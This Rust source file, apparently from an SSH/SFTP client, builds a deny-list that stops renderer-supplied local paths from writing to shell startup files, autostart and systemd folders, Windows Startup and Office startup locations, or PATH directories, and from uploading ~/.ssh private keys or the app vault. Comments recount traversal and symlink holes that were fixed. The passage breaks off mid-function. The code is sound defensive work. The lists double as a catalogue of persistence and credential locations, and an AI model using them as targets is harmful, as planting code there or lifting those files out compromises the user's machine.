//! SFTP IPC commands: directory listing, file ops, download/upload, and the
//! "open with system editor" flow (temp download + watch + auto re-upload).

use std::future::Future;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::atomic::Ordering;
use std::sync::Arc;

use notify::Watcher;
use tauri::{AppHandle, Manager};
use tokio::io::AsyncWriteExt;

use std::sync::Arc as StdArc;

use crate::sftp::{
    edit_temp_dir, staged_file_name, EditRegistry, EditWatch, KeepaliveRegistry, SftpRegistry,
    STAGE_FILE_MAX_AGE,
};
use crate::ssh_client::SessionRegistry;
use crate::AppState;

use super::{CmdError, CmdResult};
use directories::ProjectDirs;

/// What a renderer-supplied local path is about to be used for (A6-02). The
/// rules differ because the danger does: a WRITE can plant code or a login
/// backdoor, a READ can lift credentials out to a server, and merely
/// revealing a folder in the file manager does neither.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LocalAccess {
    /// Create, replace, rename or delete. Also refuses the places where a
    /// write becomes code execution or a persistent backdoor.
    Write,
    /// Read a file's contents to upload them. Also refuses SSHSpan's own
    /// configuration directory and EVERYTHING under `~/.ssh` except public
    /// keys (`*.pub`): the private keys, but equally `config`, `known_hosts`
    /// and `authorized_keys` - uploading one of those means copying it out of
    /// `~/.ssh` first. (The rule is deliberately by directory, not by guessing
    /// which file names are secret: a private key can be called anything.)
    Read,
    /// Only the base rules (app data, system directories): for a path a human
    /// approved in a native dialog, and for revealing a location in the file
    /// manager.
    Basic,
}

/// Shell startup and logout files in the home folder: anything planted there
/// runs the next time a shell starts or ends (bash, zsh, sh, ksh, csh/tcsh)
/// or a graphical session begins (the X session scripts). `.inputrc` too: a
/// readline key binding can type a whole command line into every bash.
const SHELL_STARTUP_FILES: [&str; 24] = [
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".bash_logout",
    ".bash_aliases",
    ".profile",
    ".inputrc",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".zlogin",
    ".zlogout",
    ".kshrc",
    ".mkshrc",
    ".cshrc",
    ".tcshrc",
    ".login",
    ".logout",
    ".xprofile",
    ".xinitrc",
    ".xserverrc",
    ".xsession",
    ".xsessionrc",
    ".Xsession",
];

/// Folders in the home folder that shells read startup code from.
const HOME_SHELL_DIRS: [&str; 1] = [".profile.d"];

/// Folders in the XDG config folder that shells read startup code from:
/// fish, PowerShell (on Linux and macOS) and nushell.
const CONFIG_SHELL_DIRS: [&str; 3] = ["fish", "powershell", "nushell"];

/// Folders in the XDG config folder whose contents run at login: XDG
/// autostart entries, KDE's login and logout scripts, systemd user units, and
/// the environment systemd gives every user service.
const CONFIG_STARTUP_DIRS: [&str; 6] = [
    "autostart",
    "autostart-scripts",
    "plasma-workspace/env",
    "plasma-workspace/shutdown",
    "systemd/user",
    "environment.d",
];

/// Files and folders in the home folder whose contents run when a program is
/// next used: git's settings (core.sshCommand, hooks and fsmonitor run
/// commands), the PAM environment (read at every login) and the editors'
/// startup files - SSHSpan's own edit flow starts the system editor.
const HOME_PROGRAM_FILES: [&str; 12] = [
    ".gitconfig",
    ".pam_environment",
    ".vimrc",
    ".gvimrc",
    ".exrc",
    ".vim",
    "_vimrc",
    "_gvimrc",
    "vimfiles",
    ".emacs",
    ".emacs.el",
    ".emacs.d",
];

/// The same for git, Neovim and Emacs in the XDG config folder.
const CONFIG_PROGRAM_DIRS: [&str; 3] = ["git", "nvim", "emacs"];

/// The user's own command folders, which are (or are typically) on the PATH:
/// a program planted there runs in place of the one the user meant.
const HOME_PATH_DIRS: [&str; 2] = [".local/bin", "bin"];

/// The program locations of the home folder `home`: its command folders and
/// every folder of the PATH (`path`) inside it - but not the home folder
/// itself, which would refuse every download into it - git's settings, the
/// PAM environment and the editors' startup files, also in the XDG config
/// folders `config`. Pure so the layout can be unit-tested anywhere.
fn home_program_locations(
    home: &std::path::Path,
    config: &[PathBuf],
    path: &[PathBuf],
) -> Vec<PathBuf> {
    let on_path = path.iter().filter(|dir| {
        dir.is_absolute()
            && super::path_starts_with(dir, home)
            && !super::path_starts_with(home, dir)
    });
    let locations = HOME_PATH_DIRS
        .iter()
        .map(|rel| join_parts(home, rel))
        .chain(on_path.cloned())
        .chain(HOME_PROGRAM_FILES.iter().map(|name| home.join(name)))
        .chain(
            config
                .iter()
                .flat_map(|c| CONFIG_PROGRAM_DIRS.iter().map(move |dir| c.join(dir))),
        );
    distinct(locations.map(Some))
}

/// The program locations on Windows: the WindowsApps folder (on the PATH),
/// Office's startup folders and Normal template, Windows Terminal's settings
/// (in each of its package folders, `terminal_packages`, and for the
/// unpackaged install with its fragments) and Neovim's config folder.
/// `appdata` and `local_appdata` are `%APPDATA%` and `%LOCALAPPDATA%`. Pure
/// so the layout can be unit-tested anywhere.
fn windows_program_locations(
    appdata: Option<&std::path::Path>,
    local_appdata: Option<&std::path::Path>,
    terminal_packages: &[PathBuf],
) -> Vec<PathBuf> {
    let roaming = appdata.into_iter().flat_map(|base| {
        [
            "Microsoft/Word/STARTUP",
            "Microsoft/Excel/XLSTART",
            "Microsoft/Templates/Normal.dotm",
        ]
        .map(|rel| join_parts(base, rel))
    });
    let local = local_appdata.into_iter().flat_map(|base| {
        [
            "Microsoft/WindowsApps",
            "Microsoft/Windows Terminal/settings.json",
            "Microsoft/Windows Terminal/Fragments",
            "nvim",
        ]
        .map(|rel| join_parts(base, rel))
    });
    let terminal = terminal_packages
        .iter()
        .map(|package| join_parts(package, "LocalState/settings.json"));
    roaming.chain(local).chain(terminal).collect()
}

/// Windows Terminal's package folders in `packages` (`%LOCALAPPDATA%\Packages`):
/// the stable, preview and canary installs.
fn windows_terminal_packages(packages: &std::path::Path) -> Vec<PathBuf> {
    std::fs::read_dir(packages)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|entry| {
            entry
                .file_name()
                .to_string_lossy()
                .to_ascii_lowercase()
                .starts_with("microsoft.windowsterminal")
        })
        .map(|entry| entry.path())
        .collect()
}

/// `base` joined with a `/`-separated relative path, one component at a time.
fn join_parts(base: &std::path::Path, rel: &str) -> PathBuf {
    rel.split('/')
        .fold(base.to_path_buf(), |dir, part| dir.join(part))
}

/// The per-user (`appdata`) and all-users (`program_data`) Windows Startup
/// folders. Pure so the Windows layout can be unit-tested anywhere.
fn windows_startup_dirs(
    appdata: Option<&std::path::Path>,
    program_data: Option<&std::path::Path>,
) -> Vec<PathBuf> {
    [appdata, program_data]
        .into_iter()
        .flatten()
        .map(|base| join_parts(base, "Microsoft/Windows/Start Menu/Programs/Startup"))
        .collect()
}

/// The PowerShell profile folders on Windows (`PowerShell` for PowerShell 7,
/// `WindowsPowerShell` for 5.1): in the Documents folder where Windows says
/// it is (OneDrive may have moved it) and in `~/Documents`. Pure so the
/// layout can be unit-tested anywhere.
fn powershell_profile_dirs(
    documents: Option<&std::path::Path>,
    home: Option<&std::path::Path>,
) -> Vec<PathBuf> {
    distinct([
        documents.map(std::path::Path::to_path_buf),
        home.map(|h| h.join("Documents")),
    ])
    .iter()
    .flat_map(|root| ["PowerShell", "WindowsPowerShell"].map(|name| root.join(name)))
    .collect()
}

/// The login and shell startup locations of the home folder `home`, with
/// `config` and `data` the XDG config and data folders (`~/.config` and
/// `~/.local/share`, plus wherever `XDG_CONFIG_HOME` / `XDG_DATA_HOME` move
/// them). Returns (startup folders, shell startup files and folders). Pure so
/// the layout can be unit-tested anywhere.
fn home_startup_locations(
    home: &std::path::Path,
    config: &[PathBuf],
    data: &[PathBuf],
) -> (Vec<PathBuf>, Vec<PathBuf>) {
    let startup = config
        .iter()
        .flat_map(|c| {
            CONFIG_STARTUP_DIRS
                .iter()
                .map(move |rel| join_parts(c, rel))
        })
        .chain(data.iter().map(|d| join_parts(d, "systemd/user")))
        .chain([join_parts(home, "Library/LaunchAgents")])
        .collect();
    let shell = SHELL_STARTUP_FILES
        .iter()
        .chain(HOME_SHELL_DIRS.iter())
        .map(|name| home.join(name))
        .chain(
            config
                .iter()
                .flat_map(|c| CONFIG_SHELL_DIRS.iter().map(move |dir| c.join(dir))),
        )
        .collect();
    (startup, shell)
}

/// The paths given, without the missing ones and without repeats.
fn distinct(paths: impl IntoIterator<Item = Option<PathBuf>>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    for path in paths.into_iter().flatten() {
        if !out.contains(&path) {
            out.push(path);
        }
    }
    out
}

/// The locations [`SensitiveLocations`] protects, as plain paths - before
/// they are resolved.
#[derive(Debug, Clone, Default)]
struct Locations {
    /// SSHSpan's data directory (the vault).
    app_data_dir: Option<PathBuf>,
    /// SSHSpan's managed config directory. It is a SIBLING of the app data
    /// directory, so the app-data rule does not cover it, and it holds the
    /// managed ssh config whose arbitrary-write command was de-registered
    /// because a `ProxyCommand` there runs on the next `ssh`.
    managed_config_dir: Option<PathBuf>,
    /// The user's `~/.ssh`: `config` (ProxyCommand), `authorized_keys`, keys.
    ssh_dir: Option<PathBuf>,
    /// Folders whose contents run at login: the Windows Startup folders, XDG
    /// autostart, systemd user units, launchd agents, ...
    startup_dirs: Vec<PathBuf>,
    /// Shell startup files, and the folders shells read startup code from
    /// (fish, PowerShell, nushell, `~/.profile.d`).
    shell_startup: Vec<PathBuf>,
    /// What runs when a program is next used: the user's folders on the PATH,
    /// git's settings, the editors' startup files, Office's startup folders,
    /// Windows Terminal's settings, ...
    program_files: Vec<PathBuf>,
    /// The system folders (see [`super::system_dirs`]).
    system_dirs: Vec<PathBuf>,
}

impl Locations {
    /// This machine's locations.
    fn current() -> Self {
        let home = dirs::home_dir();
        let project = ProjectDirs::from("org", "sshspan", "SSHSpan");
        let env_dir = |var: &str| {
            std::env::var_os(var)
                .map(PathBuf::from)
                .filter(|p| p.is_absolute())
        };
        let path: Vec<PathBuf> = std::env::var_os("PATH")
            .map(|p| std::env::split_paths(&p).collect())
            .unwrap_or_default();
        let (mut startup_dirs, mut shell_startup, mut program_files) = match &home {
            Some(home) => {
                let config = distinct([Some(home.join(".config")), env_dir("XDG_CONFIG_HOME")]);
                let data = distinct([
                    Some(join_parts(home, ".local/share")),
                    env_dir("XDG_DATA_HOME"),
                ]);
                let (startup, shell) = home_startup_locations(home, &config, &data);
                (startup, shell, home_program_locations(home, &config, &path))
            }
            None => (Vec::new(), Vec::new(), Vec::new()),
        };
        if cfg!(windows) {
            startup_dirs.extend(windows_startup_dirs(
                dirs::config_dir().as_deref(),
                env_dir("ProgramData").as_deref(),
            ));
            shell_startup.extend(powershell_profile_dirs(
                dirs::document_dir().as_deref(),
                home.as_deref(),
            ));
            let local = dirs::data_local_dir();
            let terminal = local
                .as_ref()
                .map(|l| windows_terminal_packages(&l.join("Packages")))
                .unwrap_or_default();
            program_files.extend(windows_program_locations(
                dirs::config_dir().as_deref(),
                local.as_deref(),
                &terminal,
            ));
        }
        Self {
            app_data_dir: project.as_ref().map(|d| d.data_dir().to_path_buf()),
            managed_config_dir: project.as_ref().map(|d| d.config_dir().to_path_buf()),
            ssh_dir: home.as_ref().map(|h| h.join(".ssh")),
            startup_dirs,
            shell_startup,
            program_files,
            system_dirs: super::system_dirs(),
        }
    }

    /// Resolve every location, once (see [`Protected`]).
    fn resolve(self) -> SensitiveLocations {
        let all = |paths: Vec<PathBuf>| -> Vec<Protected> {
            paths.into_iter().map(Protected::new).collect()
        };
        SensitiveLocations {
            app_data_dir: self.app_data_dir.map(Protected::new),
            managed_config_dir: self.managed_config_dir.map(Protected::new),
            ssh_dir: self.ssh_dir.map(Protected::new),
            startup_dirs: all(self.startup_dirs),
            shell_startup: all(self.shell_startup),
            program_files: all(self.program_files),
            system_dirs: all(self.system_dirs),
        }
    }
}

/// One protected location in each spelling a path can reach it by: as
/// configured, and resolved through whatever part of it exists (`~/.ssh` is
/// often a link into a dotfiles checkout; a Startup folder that does not
/// exist yet still resolves through the folders above it). Resolved ONCE,
/// when the [`SensitiveLocations`] are built: a check after that is a
/// comparison, without touching the disk. (Every location used to be
/// resolved again for every file of a folder transfer - about 50 resolutions
/// per file: 4 s for 10,000 files on Linux, about 90 s on Windows, before
/// anything was queued.)
#[derive(Debug, Clone)]
struct Protected {
    spellings: Vec<PathBuf>,
}

impl Protected {
    fn new(location: PathBuf) -> Self {
        let resolved = resolved_local_path(&location);
        let mut spellings = vec![location];
        if resolved != spellings[0] {
            spellings.push(resolved);
        }
        Self { spellings }
    }

    /// `path` is this location or inside it.
    fn covers(&self, path: &std::path::Path) -> bool {
        self.spellings
            .iter()
            .any(|s| super::path_starts_with(path, s))
    }

    /// This location is `path` or inside it: deleting or moving `path` takes
    /// the location along.
    fn is_within(&self, path: &std::path::Path) -> bool {
        self.spellings
            .iter()
            .any(|s| super::path_starts_with(s, path))
    }
}

const VAULT_REFUSAL: &str = "The application data directory is off-limits for SFTP transfers.";
const SYSTEM_REFUSAL: &str = "System directories are off-limits for SFTP transfers.";
const MANAGED_CONFIG_REFUSAL: &str =
    "SSHSpan's own configuration folder is off-limits for SFTP transfers.";

/// How long [`SensitiveLocations::current`] reuses one resolution of the
/// locations: short, so a `~/.ssh` re-linked elsewhere is recognised within
/// seconds; long enough that a queue starting thousands of downloads
/// resolves them a handful of times, not once per job (+9 ms per job on
/// Windows).
const SENSITIVE_REUSE: std::time::Duration = std::time::Duration::from_secs(5);

/// Local locations a (possibly compromised) renderer must not be able to aim a
/// transfer or a local-pane mutation at, resolved (see [`Protected`]). The
/// renderer supplies these paths as plain strings; this is a deny-list, not a
/// dialog-bound grant, and says so in its limits: anything outside it is
/// still reachable (see the A6-02 notes on `sftp_download`).
struct SensitiveLocations {
    /// SSHSpan's data directory (the vault): refused for every access (the
    /// base rules), and listed so that deleting or moving a folder that
    /// CONTAINS it is refused too.
    app_data_dir: Option<Protected>,
    managed_config_dir: Option<Protected>,
    ssh_dir: Option<Protected>,
    startup_dirs: Vec<Protected>,
    shell_startup: Vec<Protected>,
    program_files: Vec<Protected>,
    /// Refused for every access (the base rules).
    system_dirs: Vec<Protected>,
}

impl SensitiveLocations {
    /// This machine's locations, resolved - reused for [`SENSITIVE_REUSE`].
    fn current() -> Arc<Self> {
        type Cached = Option<(std::time::Instant, Arc<SensitiveLocations>)>;
        static LAST: std::sync::Mutex<Cached> = std::sync::Mutex::new(None);
        let mut last = LAST
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if let Some((at, locations)) = last.as_ref() {
            if at.elapsed() < SENSITIVE_REUSE {
                return Arc::clone(locations);
            }
        }
        let fresh = Arc::new(Locations::current().resolve());
        *last = Some((std::time::Instant::now(), Arc::clone(&fresh)));
        fresh
    }

    /// The rules for every access, a dialog-approved path included: nothing
    /// in SSHSpan's data folder (the vault), nothing in a system folder.
    fn base_refusal(&self, path: &std::path::Path) -> Option<&'static str> {
        if self.app_data_dir.as_ref().is_some_and(|d| d.covers(path)) {
            return Some(VAULT_REFUSAL);
        }
        self.system_dirs
            .iter()
            .any(|d| d.covers(path))
            .then_some(SYSTEM_REFUSAL)
    }

    /// Why `path` is off-limits for `access` by the deny-list, if it is. A
    /// comparison only: pass the path in its literal AND its resolved
    /// spelling (see [`Self::path_refusal`]).
    fn refusal(&self, path: &std::path::Path, access: LocalAccess) -> Option<&'static str> {
        if access == LocalAccess::Basic {
            return None;
        }
        let covered =
            |location: &Option<Protected>| location.as_ref().is_some_and(|l| l.covers(path));
        if covered(&self.app_data_dir) {
            return Some(VAULT_REFUSAL);
        }
        if covered(&self.managed_config_dir) {
            return Some(MANAGED_CONFIG_REFUSAL);
        }
        if covered(&self.ssh_dir) {
            // Public keys are not secret, and putting one on a server is an
            // everyday SSH task - so reading them is fine. Nothing is ever
            // WRITTEN into ~/.ssh by a renderer-chosen path.
            let public_key = path
                .extension()
                .is_some_and(|ext| ext.eq_ignore_ascii_case("pub"));
            if access == LocalAccess::Write {
                return Some(
                    "The ~/.ssh folder is off-limits for SFTP downloads and local changes.",
                );
            }
            if !public_key {
                return Some(
                    "Private keys and other files in ~/.ssh cannot be uploaded (public .pub keys can).",
                );
            }
        }
        // Planting a startup entry or editing a shell startup file is code
        // execution at the next login - but reading one (dotfile syncing) is
        // ordinary, so these only apply to writes.
        if access == LocalAccess::Write {
            if self.startup_dirs.iter().any(|d| d.covers(path)) {
                return Some(
                    "Startup folders (what is in them runs at login) are off-limits for SFTP downloads and local changes.",
                );
            }
            if self.shell_startup.iter().any(|f| f.covers(path)) {
                return Some(
                    "Shell startup files and folders (.bashrc, .profile, fish and PowerShell profiles, ...) are off-limits for SFTP downloads and local changes.",
                );
            }
            if self.program_files.iter().any(|f| f.covers(path)) {
                return Some(
                    "Your folders on the PATH and settings that run commands (git, vim, emacs, Office, Windows Terminal, ...) are off-limits for SFTP downloads and local changes.",
                );
            }
        }
        None
    }

    /// Why a path - in its literal and its resolved spelling - is off-limits
    /// for `access`: the base rules first, then the deny-list.
    fn path_refusal(
        &self,
        literal: &std::path::Path,
        resolved: &std::path::Path,
        access: LocalAccess,
    ) -> Option<&'static str> {
        let spellings = [resolved, literal];
        spellings
            .iter()
            .find_map(|p| self.base_refusal(p))
            .or_else(|| spellings.iter().find_map(|p| self.refusal(p, access)))
    }

    /// Why nothing in the folder (literal and resolved spelling) may be
    /// uploaded: the base rules and SSHSpan's configuration folder refuse
    /// every file in it. (`~/.ssh` does not: its public keys may be uploaded,
    /// so its files are judged one by one.)
    fn folder_read_refusal(
        &self,
        literal: &std::path::Path,
        resolved: &std::path::Path,
    ) -> Option<&'static str> {
        let spellings = [resolved, literal];
        spellings
            .iter()
            .find_map(|p| self.base_refusal(p))
            .or_else(|| {
                spellings
                    .iter()
                    .any(|p| {
                        self.managed_config_dir
                            .as_ref()
                            .is_some_and(|d| d.covers(p))
                    })
                    .then_some(MANAGED_CONFIG_REFUSAL)
            })
    }

    /// Which protected location `path` HOLDS (is that location, or a folder
    /// above it), if any: deleting or moving such a folder deletes or moves
    /// the protected location with it - the home folder takes `~/.ssh`, the
    /// shell rc files and SSHSpan's data along. Both spellings of `path`
    /// (literal and resolved) are compared with both spellings of each
    /// location (a `~/.ssh` that is a link into a dotfiles checkout makes
    /// the checkout hold the keys).
    fn held_by(&self, path: &std::path::Path) -> Option<&'static str> {
        let resolved = resolved_local_path(path);
        let holds =
            |location: &Protected| location.is_within(path) || location.is_within(&resolved);
        let single: [(&Option<Protected>, &'static str); 3] = [
            (&self.ssh_dir, "your ~/.ssh folder"),
            (&self.managed_config_dir, "SSHSpan's configuration folder"),
            (&self.app_data_dir, "SSHSpan's data folder (the vault)"),
        ];
        if let Some((_, what)) = single
            .iter()
            .find(|(location, _)| location.as_ref().is_some_and(holds))
        {
            return Some(what);
        }
        if self.startup_dirs.iter().any(holds) {
            return Some("a startup folder (what is in it runs at login)");
        }
        if self.shell_startup.iter().any(holds) {
            return Some("a shell startup file (.bashrc, .profile, ...)");
        }
        if self.program_files.iter().any(holds) {
            return Some("a folder on your PATH or a settings file that runs commands");
        }
        None
    }
}

/// `dunce::canonicalize` - the one way the local-path rules resolve a path, so
/// the tests can count how often that happens (each is several syscalls, and
/// a per-FILE resolution made big folder transfers crawl).
fn canonical(p: &std::path::Path) -> std::io::Result<PathBuf> {
    #[cfg(test)]
    tests::count_resolution();
    dunce::canonicalize(p)
}

/// `path` with symlinks resolved as far as the filesystem allows: the whole
/// path when it exists, otherwise its deepest existing ancestor, resolved,
/// with the rest joined on - a not-yet-existing target (a download, a folder
/// the queue will create) resolves through whatever above it exists, so a
/// link to `~/.ssh` cannot hide behind levels that do not exist yet. (Only the
/// parent used to be tried.) dunce::canonicalize (not std::fs::canonicalize):
/// on Windows std returns a `\\?\`-prefixed path, and `Path::starts_with`
/// compares prefix components exactly, so a verbatim path NEVER matched the
/// plain `C:\Users\...` app-data dir - the guard fired only for paths that did
/// not exist yet, i.e. it was inverted exactly where a write could succeed.
/// dunce keeps existing paths in the plain form so both shapes compare (and
/// for a path dunce keeps verbatim - one longer than 260 characters -
/// [`super::path_starts_with`] compares the prefix by its plain form).
fn resolved_local_path(p: &std::path::Path) -> PathBuf {
    let mut existing = p;
    let mut rest: Vec<&std::ffi::OsStr> = Vec::new();
    loop {
        if let Ok(real) = canonical(existing) {
            return rest.iter().rev().fold(real, |path, part| path.join(part));
        }
        match (existing.parent(), existing.file_name()) {
            (Some(parent), Some(name)) => {
                rest.push(name);
                existing = parent;
            }
            _ => return p.to_path_buf(),
        }
    }
}

/// Guard every renderer-supplied local filesystem target against the app
/// data directory, system directories and - depending on `access` - the
/// sensitive locations in [`SensitiveLocations`]. Runs for BOTH directions: a
/// download must not write there, and an upload must not read the vault (or
/// other app-private files) out to a server. The app data rule mirrors
/// `validate_export_path`; the system-dir rule uses the same list, so a
/// (hypothetically compromised) renderer cannot aim SFTP transfers at
/// `C:\Windows`, `/etc`, or friends either.
///
/// The target is judged in its literal spelling and resolved through the
/// deepest part of it that exists: the parent may not exist yet (the queue
/// path creates it later) and the target may already exist.
fn validate_sftp_local_path(path: &str, access: LocalAccess) -> CmdResult<()> {
    validate_sftp_local_path_with(path, access, &SensitiveLocations::current())
}

fn validate_sftp_local_path_with(
    path: &str,
    access: LocalAccess,
    sensitive: &SensitiveLocations,
) -> CmdResult<()> {
    match local_path_refusal(std::path::Path::new(path), access, sensitive) {
        Some(why) => Err(CmdError(why)),
        None => Ok(()),
    }
}

/// Why `p` is refused for `access`, if it is - the rule
/// [`validate_sftp_local_path`] applies.
fn local_path_refusal(
    p: &std::path::Path,
    access: LocalAccess,
    sensitive: &SensitiveLocations,
) -> Option<String> {
    if let Some(why) = local_path_shape_refusal(p) {
        return Some(why.to_string());
    }
    // Every rule is judged on the RESOLVED path (through the deepest part
    // that exists) and on the literal one, so neither a symlinked folder
    // nor a not-yet-existing target slips past.
    let resolved = resolved_local_path(p);
    sensitive
        .path_refusal(p, &resolved, access)
        .map(str::to_string)
}

/// A renderer-supplied local path must be absolute and free of `..`.
fn local_path_shape_refusal(p: &std::path::Path) -> Option<&'static str> {
    if !p.is_absolute() {
        return Some("Local path must be absolute.");
    }
    // `..` is resolved before the disk is consulted (Windows always, and
    // `create_dir_all` walks through it), so `<home>/x/../.ssh` reached
    // `~/.ssh` while neither spelling matched the deny-list.
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Some("Local paths must not contain \"..\" - use the folder's full path instead.");
    }
    None
}

/// Non-erroring form of the read rule for DESCENDANT filtering (F5) and for
/// a link an upload follows: `validate_sftp_local_path` gates the
/// user-selected ROOT of an upload, but a recursive walk enqueues descendants
/// without re-checking, so an allowed ancestor that CONTAINS app data (or a
/// symlink to a protected file) would upload the vault database - or, with
/// the home directory as the root, everything under `~/.ssh` but the public
/// keys. This predicate answers "is this exact path, or the canonical target
/// it resolves to, protected?" Symlinked files are checked against their
/// canonical target, closing the symlink-to-vault gap.
fn is_protected_upload_source(path: &std::path::Path) -> bool {
    protected_upload_source(path, &SensitiveLocations::current()).is_some()
}

/// Why `path` (and the target it resolves to) may not be uploaded, if so.
fn protected_upload_source(
    path: &std::path::Path,
    sensitive: &SensitiveLocations,
) -> Option<&'static str> {
    // Canonicalize resolves the final symlink component too, so a symlink to
    // the vault DB is recognized by its target.
    let normalized = canonical(path).unwrap_or_else(|_| path.to_path_buf());
    sensitive.path_refusal(path, &normalized, LocalAccess::Read)
}

#[cfg(test)]
fn is_protected_upload_source_with(path: &std::path::Path, sensitive: &SensitiveLocations) -> bool {
    protected_upload_source(path, sensitive).is_some()
}

/// Why a local path built from REMOTE names - a file or folder of a folder
/// download, an edit session's staged copy - must not be written, if it must
/// not (A6-02). Only the destination folder used to be checked, so a remote
/// folder holding `.bashrc` or `.ssh/authorized_keys`, downloaded into the
/// home folder, wrote exactly those. The path must be a plain chain of usable
/// names below `root` - no `..`, root, drive or share, no NUL or other
/// control character, no Windows device name, nothing Windows would rename
/// on disk - and the final path passes the write deny-list.
fn derived_local_refusal(
    root: &std::path::Path,
    path: &std::path::Path,
    sensitive: &SensitiveLocations,
) -> Option<String> {
    derived_local_refusal_under(&resolved_local_path(root), root, path, sensitive)
}

/// [`derived_local_refusal`] with `root`'s resolved spelling already known
/// (a folder download resolves its destination once).
fn derived_local_refusal_under(
    root_resolved: &std::path::Path,
    root: &std::path::Path,
    path: &std::path::Path,
    sensitive: &SensitiveLocations,
) -> Option<String> {
    let plain = path.strip_prefix(root).is_ok_and(|rel| {
        rel.components().all(|c| match c {
            std::path::Component::Normal(name) => name.to_str().is_some_and(is_plain_local_name),
            _ => false,
        })
    });
    if !plain {
        return Some(
            "its local path would not be a plain file name inside the destination folder"
                .to_string(),
        );
    }
    // Follow existing ancestors BEFORE creating anything: an already-planted
    // link can point outside the destination, even when the file or the rest
    // of the folder chain does not exist yet.
    let resolved = resolved_local_path(path);
    if !super::path_starts_with(&resolved, root_resolved) {
        return Some("its local path resolves outside the destination folder".to_string());
    }
    if let Some(why) = local_path_shape_refusal(path) {
        return Some(why.to_string());
    }
    sensitive
        .path_refusal(path, &resolved, LocalAccess::Write)
        .map(str::to_string)
}

/// A name the sanitizer leaves as it is - one it produced included (it is
/// idempotent, see [`sanitize_remote_name`]).
fn is_plain_local_name(name: &str) -> bool {
    sanitize_remote_name(name).as_deref() == Some(name)
}

/// The write deny-list on a queued download's final local path, re-checked
/// when the transfer starts: a job can be resumed long after it was queued
/// (after a reconnect, after a restart). The protected locations are reused
/// between jobs (see [`SensitiveLocations::current`]), so this resolves the
/// job's own path only.
pub(crate) fn local_write_refusal(path: &std::path::Path) -> Option<String> {
    local_write_refusal_with(path, &SensitiveLocations::current())
}

fn local_write_refusal_with(
    path: &std::path::Path,
    sensitive: &SensitiveLocations,
) -> Option<String> {
    local_path_refusal(path, LocalAccess::Write, sensitive)
}

/// The rule [`sftp_download`] applies to its target: a path the user picked
/// in the native save dialog (`granted`) only has to clear the base rules; any
/// other path is a renderer-supplied string and gets the full write deny-list.
fn check_download_target(
    local: &str,
    granted: bool,
    sensitive: &SensitiveLocations,
) -> CmdResult<()> {
    let access = if granted {
        LocalAccess::Basic
    } else {
        LocalAccess::Write
    };
    validate_sftp_local_path_with(local, access, sensitive)
}

/// Where an edit session stages its copy of `file_name`: a fresh, unguessable
/// name directly inside `temp_dir`, re-checked like every other local path a
/// remote name leads to. The prefix used to be the first 8 BYTES of the
/// renderer-supplied session id, verbatim: `../../evil` put the copy two
/// folders up, and a multi-byte character at byte 8 panicked the command.
/// Only letters, digits and `-` of it are kept now.
fn edit_stage_path(
    temp_dir: &std::path::Path,
    session_id: &str,
    file_name: &str,
    sensitive: &SensitiveLocations,
) -> Result<PathBuf, String> {
    let prefix: String = session_id
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-')
        .take(8)
        .collect();
    let prefix = if prefix.is_empty() { "edit" } else { &prefix };
    let path = temp_dir.join(format!("{prefix}-{}", staged_file_name(file_name)));
    match derived_local_refusal(temp_dir, &path, sensitive) {
        None => Ok(path),
        Some(why) => Err(format!(
            "{file_name} cannot be opened for editing: the local copy at {} is refused ({why}).",
            path.display()
        )),
    }
}

/// Refuse anything that touches a remote filesystem while the vault is locked.
///
/// SECURITY: `terminal_connect` and `server_test` both check this; no `sftp_*`
/// command did. Locking is the app's answer to an unattended machine, and it
/// promises to end remote access - but an SFTP channel lives on its own russh
/// channel, so it survived the shell teardown and every listing, download,
/// upload and delete kept working against a "locked" vault.
fn require_unlocked(app: &AppHandle) -> CmdResult<()> {
    if super::vault_password(app)?.is_empty() {
        return Err(CmdError("Vault is locked.".into()));
    }
    Ok(())
}

fn sftp_from_session(
    app: &AppHandle,
    session_id: &str,
) -> Result<Arc<russh_sftp::client::SftpSession>, CmdError> {
    // Single choke point: every command that reaches the remote filesystem
    // resolves its session here, so the gate belongs here rather than in ~40
    // command bodies where one would eventually be missed.
    require_unlocked(app)?;
    app.state::<SftpRegistry>()
        .get(session_id)
        .ok_or_else(|| CmdError("SFTP is not open for this session - switch to SFTP first.".into()))
}

/// Render a russh-sftp error as a clean, single-layer message.
///
/// russh-sftp's `Status` Display is "{status_code}: {error_message}", which
/// for a bare SSH_FXP_FAILURE with no message becomes "Failure: " (or
/// "Failure: Failure" when the server echoes the code name as the message).
/// Re-wrapping that in "download failed: ..." produced the user-facing
/// "download failed: Failure: Failure" toast that hid the real cause.
/// This helper surfaces the status code meaningfully instead.
pub(crate) fn sftp_error_detail(e: russh_sftp::client::error::Error) -> String {
    match e {
        russh_sftp::client::error::Error::Status(status) => {
            let code = status.status_code as u32;
            let msg = status.error_message.trim();
            // A message that just repeats the code name ("Failure") adds nothing.
            let code_name = status.status_code.to_string();
            if msg.is_empty() || msg == code_name {
                format!("SFTP server returned {code_name} (code {code}) with no further detail")
            } else {
                format!("{code_name} (code {code}): {msg}")
            }
        }
        other => other.to_string(),
    }
}

/// `CmdError` wrapper around [`sftp_error_detail`] with a stage prefix.
fn describe_sftp_error(stage: &str, e: russh_sftp::client::error::Error) -> CmdError {
    CmdError(format!("{stage} failed: {}", sftp_error_detail(e)))
}

/// Read-loop error on an open SFTP file handle: russh-sftp surfaces raw
/// read failures as `std::io::Error` wrapping the protocol-level error
/// (e.g. a bare SSH_FX_FAILURE). Unwrap the wrapper's Display chain so the
/// message goes through [`sftp_error_detail`] instead of the raw doubled
/// "Failure: Failure" text.
pub(crate) fn describe_download_read_error(e: std::io::Error) -> CmdError {
    use std::error::Error as _;
    // The client Error enum is private from the protocol module; match on
    // the Display text is fragile, so walk the source chain and try the
    // public client error type first, then fall back to the raw message.
    let mut src: Option<&(dyn std::error::Error + 'static)> = e.source();
    let mut detail = None;
    while let Some(err) = src {
        if let Some(status) = err.downcast_ref::<russh_sftp::client::error::Error>() {
            detail = Some(sftp_error_detail(status.clone()));
            break;
        }
        src = err.source();
    }
    match detail {
        Some(d) => CmdError(format!("download failed: {d}")),
